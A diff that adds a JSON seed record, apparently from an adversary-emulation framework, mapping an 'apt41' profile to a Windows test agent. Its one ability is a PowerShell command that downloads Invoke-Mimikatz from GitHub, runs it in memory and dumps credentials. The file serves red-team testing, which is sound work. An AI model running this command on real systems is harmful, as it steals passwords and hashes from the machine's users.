@@ -1,0 +1,37 @@
+{
+  "agent_paw": "fgdafj",
+  "agent_host": "WS10",
+  "agent_platform": "windows",
+  "agent_executors": [
+    "cmd",
+    "psh",
+    "proc"
+  ],
+  "adversary_id": "temp-seed-fgdafj-1775111360",
+  "adversary_name": "Temp Seed Windows - apt41",
+  "referenced_ability_count": 1,
+  "compatible_count": 1,
+  "incompatible_count": 0,
+  "missing_count": 0,
+  "fixed_embedded_count": 0,
+  "compatible": [
+    {
+      "ability_id": "82dcefb5c3512d73bf2248cb0127c4ae",
+      "name": "Powershell Mimikatz",
+      "tactic": "credential-access",
+      "technique_id": "T1003.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 1,
+      "windows_command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    }
+  ],
+  "incompatible": [],
+  "missing": [],
+  "noisy_only_mode": true,
+  "seed_only_mode": true
+}
